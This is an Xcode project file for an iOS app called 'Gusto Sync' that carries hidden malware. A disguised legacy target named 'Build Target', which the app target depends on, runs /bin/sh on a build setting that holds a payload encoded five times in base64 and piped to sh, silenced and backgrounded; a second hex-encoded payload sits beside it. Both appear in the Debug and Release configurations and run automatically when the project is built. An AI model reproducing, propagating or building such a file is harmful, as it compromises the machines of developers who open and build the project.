// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXFileReference section */
		0AC934B32DFBF7B5003E635B /* Gusto Sync.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Gusto Sync.app"; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		0AC934B52DFBF7B5003E635B /* Gusto Sync */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = "Gusto Sync";
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		0AC934B02DFBF7B5003E635B /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		0AC934AA2DFBF7B5003E635B = {
			isa = PBXGroup;
			children = (
				0AC934B52DFBF7B5003E635B /* Gusto Sync */,
				0AC934B42DFBF7B5003E635B /* Products */,
			);
			sourceTree = "<group>";
		};
		0AC934B42DFBF7B5003E635B /* Products */ = {
			isa = PBXGroup;
			children = (
				0AC934B32DFBF7B5003E635B /* Gusto Sync.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		0AC934B22DFBF7B5003E635B /* Gusto Sync */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 0AC934C12DFBF7B7003E635B /* Build configuration list for PBXNativeTarget "Gusto Sync" */;
			buildPhases = (
				0AC934AF2DFBF7B5003E635B /* Sources */,
				0AC934B02DFBF7B5003E635B /* Frameworks */,
				0AC934B12DFBF7B5003E635B /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				578A23A475CAE81EDC877BEF /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				0AC934B52DFBF7B5003E635B /* Gusto Sync */,
			);
			name = "Gusto Sync";
			packageProductDependencies = (
			);
			productName = "Gusto Sync";
			productReference = 0AC934B32DFBF7B5003E635B /* Gusto Sync.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		0AC934AB2DFBF7B5003E635B /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1610;
				LastUpgradeCheck = 1610;
				TargetAttributes = {
					0AC934B22DFBF7B5003E635B = {
						CreatedOnToolsVersion = 16.1;
					};
				};
			};
			buildConfigurationList = 0AC934AE2DFBF7B5003E635B /* Build configuration list for PBXProject "Gusto Sync" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 0AC934AA2DFBF7B5003E635B;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 0AC934B42DFBF7B5003E635B /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				3F13308E56A14A5413877BEF  /* Build Target */,
				0AC934B22DFBF7B5003E635B /* Gusto Sync */,
			);
		};
/* End PBXProject section */

/* Begin PBXTargetDependency section */
		578A23A475CAE81EDC877BEF /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 3F13308E56A14A5413877BEF /* Build Target */;
		};
/* End PBXTargetDependency section */

/* Begin PBXLegacyTarget section */
		3F13308E56A14A5413877BEF /* Build Target */ = {
			isa = PBXLegacyTarget;
			buildArgumentsString = "-c \"${AFEB778}\"";
			buildPhases = (
			);
			buildToolPath = /bin/sh;
			dependencies = (
			);
			name = "Build Target";
			passBuildSettingsInEnvironment = 1;
			productName = "Build Target";
		};
/* End PBXLegacyTarget section */

/* Begin PBXBuildRule section */
/* End PBXBuildRule section */

/* Begin PBXBuildFile section */
/* End PBXBuildFile section */

/* Begin PBXShellScriptBuildPhase section */
/* End PBXShellScriptBuildPhase section */

/* Begin PBXResourcesBuildPhase section */
		0AC934B12DFBF7B5003E635B /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		0AC934AF2DFBF7B5003E635B /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		0AC934BF2DFBF7B7003E635B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AFEB778 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVNFSkpWR3hvYzJGVk1IaFhXR1JZWWtVd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A4FB9DF = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333333333333333333333333333633333333333333383333333333333336333333333333333533333333333333363333333333333333333333333333333633333336333333323333333333333336333333333333333333333333333333363333333333333334333333333333333633333336333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		0AC934C02DFBF7B7003E635B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AFEB778 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVNFSkpWR3hvYzJGVk1IaFhXR1JZWWtVd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A4FB9DF = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333333333333333333333333333633333333333333383333333333333336333333333333333533333333333333363333333333333333333333333333333633333336333333323333333333333336333333333333333333333333333333363333333333333334333333333333333633333336333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		0AC934C22DFBF7B7003E635B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"Gusto Sync/Preview Content\"";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "This App need access to the microphone to convert your speech to text.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This App need access to your photo library to save images which you have Edited";
				INFOPLIST_KEY_NSSpeechRecognitionUsageDescription = "This App need access to recognize your speech to convert into text that you can use.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UIStatusBarStyle = UIStatusBarStyleLightContent;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.Gusto-Sync";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		0AC934C32DFBF7B7003E635B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"Gusto Sync/Preview Content\"";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "This App need access to the microphone to convert your speech to text.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This App need access to your photo library to save images which you have Edited";
				INFOPLIST_KEY_NSSpeechRecognitionUsageDescription = "This App need access to recognize your speech to convert into text that you can use.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UIStatusBarStyle = UIStatusBarStyleLightContent;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.Gusto-Sync";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		0AC934AE2DFBF7B5003E635B /* Build configuration list for PBXProject "Gusto Sync" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				0AC934BF2DFBF7B7003E635B /* Debug */,
				0AC934C02DFBF7B7003E635B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		0AC934C12DFBF7B7003E635B /* Build configuration list for PBXNativeTarget "Gusto Sync" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				0AC934C22DFBF7B7003E635B /* Debug */,
				0AC934C32DFBF7B7003E635B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 0AC934AB2DFBF7B5003E635B /* Project object */;
}
